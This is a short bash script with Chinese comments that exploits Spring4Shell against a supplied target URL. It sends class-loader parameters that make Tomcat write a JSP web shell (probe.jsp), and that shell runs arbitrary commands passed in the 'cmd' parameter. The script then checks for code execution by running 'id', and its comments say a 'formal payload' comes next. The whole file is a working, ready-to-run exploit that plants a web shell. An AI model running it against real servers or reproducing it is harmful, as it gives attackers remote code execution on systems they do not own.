#!/usr/bin/env bash
# 只做"写探针 + 验证"，不落真马；成功后再换正式 payload
TARGET="${1:?usage: bash spring4shell.sh http://TARGET:PORT}"
B="${TARGET%/}"
PATTERN='%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i'
curl -sS -m 15 -X POST "$B/" \
  --data-urlencode "class.module.classLoader.resources.context.parent.pipeline.first.pattern=$PATTERN" \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.prefix=probe' \
  --data-urlencode 'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=' \
  -o /dev/null -w 'write=%{http_code}\n'
sleep 2
curl -sS -m 10 "$B/probe.jsp?cmd=id" | head -3
# 判定：probe.jsp 返回 uid= 即成功；若 404 → directory 改为实际 web 根（webapps/<app>）再试
